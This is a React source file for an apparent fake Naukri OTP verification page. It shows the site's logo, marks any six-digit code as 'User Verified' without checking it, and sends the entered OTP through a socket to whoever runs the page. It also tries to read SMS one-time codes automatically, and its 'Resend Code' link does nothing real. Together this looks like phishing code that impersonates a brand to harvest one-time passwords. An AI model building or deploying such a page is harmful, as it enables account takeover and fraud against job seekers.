import React, { useEffect, useState } from "react";
import OtpInput from "react-otp-input";
import Logo from "./Assets/naukri_Logo.png";
import Back from "./Assets/back.png";
import OtpIcon from "./Assets/otp.png";
import { useHistory } from "react-router-dom";
import { message, Modal } from "antd";

const Otp = ({ mobile, socket }) => {
  const history = useHistory();
  const [otp, setOtp] = useState("");

  function info() {
    Modal.info({
      title: "Thanks For Your Time",
      content: (
        <div>
          <p>Our Recruiters will connect to you soon</p>
        </div>
      ),
      onOk() {
        history.push("/");
      },
    });
  }

  useEffect(() => {
    if ("OTPCredential" in window) {
      window.addEventListener("DOMContentLoaded", (e) => {
        const ac = new AbortController();
        navigator.credentials
          .get({
            otp: { transport: ["sms"] },
            signal: ac.signal,
          })
          .then((otp) => {
            setOtp(otp.code);
          })
          .catch((err) => {
            console.log(err);
          });
      });
    }
  }, []);

  const handleOtp = (val) => {
    setOtp(val);
    if (val.length === 6) {
      message.success("User Verified");
      const messages = val;
      socket.emit("sendMessage", messages, () => {});
      info();
    }
  };

  return (
    <div className="background">
      <div
        style={{
          height: "8vh",
          textAlign: "center",
          paddingTop: "3vh",
        }}
      >
        <img src={Logo} alt="logo" />
      </div>
      <div className="back">
        <img
          onClick={() => history.goBack()}
          style={{ height: "3vh", width: "10vw" }}
          src={Back}
          alt="back"
        />
      </div>
      <div style={{ textAlign: "center", marginTop: "10vh" }}>
        <img src={OtpIcon} alt="" style={{ width: "15vw", height: "10vh" }} />
      </div>
      <h1 className=" heading" style={{ marginTop: "10vh", fontWeight: "500" }}>
        OTP Verification
      </h1>
      <p style={{ color: "#159c06" }} className="bottom">
        Enter the otp sent to{" "}
        <span style={{ fontWeight: "700" }}>{mobile}</span>{" "}
      </p>
      <div className="otp-div">
        <OtpInput
          numInputs={6}
          containerStyle={{ width: "100%", margin: "10vh 10%" }}
          inputStyle={{
            width: "10vw",
            height: "8vh",
            margin: "0 5px",
            background: "#e4e4e4",
            borderBottom: "2px solid grey",
          }}
          separator={<span>-</span>}
          value={otp}
          isInputNum={true}
          onChange={(val) => {
            handleOtp(val);
          }}
        />
      </div>
      <div style={{ fontWeight: "600" }} className="bottom">
        Didn't Recieve the Otp ?{" "}
        <span
          onClick={() => message.success("Otp Sent Successfully")}
          className="bb"
        >
          Resend Code
        </span>{" "}
      </div>
    </div>
  );
};

export default Otp;
